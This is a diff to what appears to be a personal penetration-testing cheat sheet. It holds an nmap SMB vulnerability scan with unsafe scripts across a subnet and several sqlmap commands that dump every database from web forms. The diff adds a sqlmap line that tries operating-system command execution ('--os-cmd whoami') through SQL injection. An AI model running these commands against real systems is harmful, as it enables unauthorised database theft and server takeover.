@@ -2595,9 +2595,12 @@ nmap  --script smb-check-vulns.nse --script-args=unsafe=1 -p445 192.168.1.0/24 -
 
 /pentest/database/sqlmap/sqlmap.py -u "http://ZZZZ4/forgotpass.aspx" --data="__VIEWSTATE=%2FZZZZZZ&email=a&submit=Password" --dump-all --exclude-sysdbs
 
-
 # for use with burpsuite and NTLM stop and threads also good stuff
 /bin/python2.7.exe sqlmap.py  --start=1 --stop=10 --threads=10  -p Batch_dt --dbms=mssql --proxy="http://localhost:8080" -u 'http://yaySQLI?Batch_dt=8%2f12%2f2015&Batch_nbr=1&Loc=MOB'  --dump-all --exclude-sysdbs
+
+# agent tag and burp support / mmysql example os-cmd edit dicts.py to change common paths 
+sqlmap -u "https://adsfsadfafasd/search.php" --dbms MySql --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --proxy=https://localhost:8080 --os-cmd whoami
+
 
 # convert amr to mp3
 ffmpeg -i file.amr -vn -acodec libmp3lame -ac 2 -ab 96k file.mp3
